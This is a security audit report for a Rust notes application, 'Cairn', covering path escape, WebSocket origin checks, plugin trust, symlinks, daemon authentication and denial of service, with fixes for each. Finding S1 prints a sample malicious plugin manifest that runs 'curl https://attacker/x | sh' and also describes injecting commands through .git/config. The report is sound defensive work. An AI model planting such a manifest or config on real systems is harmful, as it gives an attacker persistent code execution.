# Cairn — Security Findings

Each finding: severity, location(s), description, impact, recommendation.

---

## S1. Note-write path escapes into `.cairn/` and `.git/` → remote/persistent code execution

**Severity: Critical**

**Locations:**
- `crates/cairn-domain/src/note.rs:15-27` (`NotePath::new`)
- `crates/cairn-infra/src/localfs.rs:83-89` (`LocalFsStore::write`)
- `crates/cairn-infra/src/plugin_host.rs:375-393` (`spawn_plugin` → `Command::new`)

**Description.** `NotePath::new` rejects only absolute paths, empty paths, and `..`
segments. It does **not** reject leading-dot directory segments, so
`.cairn/plugins/evil/manifest.toml` and `.git/config` are accepted as valid note
paths. `LocalFsStore::write` then joins the path under the root and creates any
missing parent directories, writing wherever the path points inside the repo.

This is reachable from every write surface:
- the CLI `write` command,
- the daemon `WriteNote` command (`/command`),
- any plugin holding the `fs:write` capability (host callback `write_note`).

A single write of `.cairn/plugins/evil/manifest.toml` with contents such as:

```toml
id = "evil"
name = "Evil"
version = "0"
[engine]
command = "/bin/sh"
args = ["-c", "curl https://attacker/x | sh"]
```

plants a plugin that the daemon spawns on its **next startup**
(`ProcessPluginHost::load_with_timeout` iterates `.cairn/plugins/*` and runs
`Command::new(command).args(args)` — `plugin_host.rs:362-393`). No executable bit
is needed because the manifest names an existing interpreter. This converts any
note write into persistent arbitrary command execution with the user's
privileges.

A second vector: writing `.git/config` with a `[core] fsmonitor = "..."` (or
`pager`/alias/`sshCommand`) entry causes the user's own `git` CLI to execute the
injected command on the next git operation in that repo.

**Impact.** Full code execution from the lowest-privilege write surface
(including a plugin that only declared `fs:write`, or a daemon client). Breaks the
core invariant that a cairn is "just markdown files."

**Recommendation.** Harden `NotePath::new` to reject any path segment beginning
with `.` (or at minimum a `.git`/`.cairn` first segment), and have
`LocalFsStore` canonicalize the resolved path and assert it stays within
`root`/excludes the `.git` and `.cairn` control directories before writing,
renaming, or deleting. Treat this as a domain invariant covered by tests.

---

## S2. WebSocket `/events` stream is not protected by CORS / no Origin validation

**Severity: High**

**Locations:**
- `crates/cairn-daemon/src/lib.rs:183-186` (`events_handler`)
- `crates/cairn-daemon/src/lib.rs:254-261` (`build_router`)
- `docs/decisions/0004-daemon-cors.md` (states "CORS is the only gate")

**Description.** ADR-0004 correctly identifies that the loopback-bound daemon is
reachable from any web page the user visits (localhost CORS / DNS-rebinding) and
relies entirely on a deny-by-default CORS allowlist. However, browsers do **not**
apply CORS / same-origin policy to the WebSocket API: a cross-origin page can open
`ws://127.0.0.1:7777/events` and the browser will deliver frames regardless of the
`Access-Control-Allow-Origin` header. The handler upgrades unconditionally and
never inspects the `Origin` header.

**Impact.** Any website the user visits can silently subscribe to the cairn's live
event stream and exfiltrate every changed/deleted note path and commit id in real
time — a confidentiality leak that the documented CORS gate does not cover.

**Recommendation.** Validate the `Origin` header against the same allowlist
inside `events_handler` before calling `ws.on_upgrade`, rejecting upgrades from
disallowed/cross origins (and from requests with an `Origin` not in the list).
Add a regression test that a disallowed origin's WS upgrade is refused.

---

## S3. Plugin trust boundary: self-declared capabilities + arbitrary executable, no approval/sandbox

**Severity: High**

**Locations:**
- `crates/cairn-infra/src/plugin_host.rs:375-393, 432` (spawn + capability source)
- `crates/cairn-plugin-protocol/src/lib.rs:196-205` (`EngineSection`)
- `crates/cairn-infra/src/plugin_host.rs:183-199` (capability gate)

**Description.** The capability list that gates host callbacks is read from the
plugin's **own** `manifest.toml` (`capabilities: manifest.engine.capabilities`).
A plugin therefore grants itself any capability it wants. More fundamentally, the
host spawns the manifest's `command` as an arbitrary child process with the
user's full privileges — there is no signing, no user approval/consent step, and
no sandbox. The capability gate only narrows the host-callback RPC surface, not
what the process can do directly (network, filesystem, exec).

**Impact.** Installing/placing a plugin directory is equivalent to running an
arbitrary binary. The capability model gives a false impression of confinement.

**Recommendation.** Document the boundary explicitly (a plugin == trusted code).
Add an install-time approval/allowlist (e.g. a signed/`trusted` list in
`cairn.toml` the user must edit) before any plugin is spawned, and consider OS-level
sandboxing for the child. At minimum, surface declared capabilities to the user at
load time.

---

## S4. Symlink traversal / TOCTOU — lexical path checks only

**Severity: Medium**

**Locations:**
- `crates/cairn-domain/src/note.rs:15-27`
- `crates/cairn-infra/src/localfs.rs:78-114` (read/write/rename/delete via `self.full`)

**Description.** `NotePath` performs purely lexical validation; the store resolves
`root.join(path)` and lets the OS follow symlinks. If a symlink exists inside the
cairn (e.g. `notes/out -> /etc`, planted by another process, a synced folder, or a
cloned repo where symlinks are tracked), reads and writes through it escape the
root. The validation and the filesystem op are also separated in time (TOCTOU).

**Impact.** Read/write outside the intended cairn directory; potential overwrite
of sensitive files depending on the user's privileges.

**Recommendation.** Canonicalize the resolved target and verify it is still under
the canonicalized root before each operation; reject paths that traverse a
symlink out of the root. Consider `O_NOFOLLOW`-style handling for the final
component.

---

## S5. Daemon has no authentication (LoopbackTrust)

**Severity: Medium**

**Locations:**
- `crates/cairn-daemon/src/lib.rs:1-3` (module doc: "no authentication (LoopbackTrust)")
- `crates/cairn-daemon/src/main.rs:140-145` (bind `127.0.0.1`)

**Description.** The daemon authenticates nothing; CORS only constrains browsers.
Any local process or any other user on a multi-user host can POST to `/command`
to write, delete, rename notes, commit, and invoke plugin commands (which, with
S1/S3, reaches code execution).

**Impact.** On shared/multi-user machines, full read/write control of another
user's cairn by any local actor. CORS provides no protection against non-browser
clients.

**Recommendation.** Add a local bearer token (written to a `0600` file under
`.cairn/`, required on `/command` and `/query`), or bind to a Unix domain socket
with filesystem permissions. Document the trust model in the README.

---

## S6. Mutex-poisoning denial of service

**Severity: Medium**

**Locations:**
- `crates/cairn-daemon/src/lib.rs:93, 121, 129` (`.lock().expect("engine mutex poisoned")`)

**Description.** Engine work runs under `Mutex` inside `spawn_blocking`. If any
engine operation panics (e.g. a plugin host that panics — see the explicit note at
`crates/cairn-app/src/lib.rs:474-501` that a panicking host is not caught), the
mutex is poisoned. Every subsequent `lock().expect(...)` then panics, and the
daemon returns 500 for all requests permanently.

**Impact.** A single triggerable panic (untrusted input that reaches a panicking
code path, or a misbehaving plugin) permanently bricks the running daemon.

**Recommendation.** Recover from poisoning (`lock().unwrap_or_else(|e| e.into_inner())`)
or use a non-poisoning mutex (e.g. `parking_lot`), and add `catch_unwind` around
plugin invocations so a plugin panic doesn't poison shared state.

---

## S7. `NotePath` does not reject Windows absolute/drive paths

**Severity: Low**

**Location:** `crates/cairn-domain/src/note.rs:16-19`

**Description.** Backslashes are normalized to `/`, then absoluteness is checked
only via `starts_with('/')`. A path like `C:\secret` becomes `C:/secret`, which is
not caught and is a drive-absolute path on Windows; UNC paths (`\\host\share`)
similarly slip through.

**Impact.** Path escape on Windows targets.

**Recommendation.** Reject paths with a Windows drive prefix or UNC root; prefer
validating with `std::path::Component` semantics rather than string prefixes.
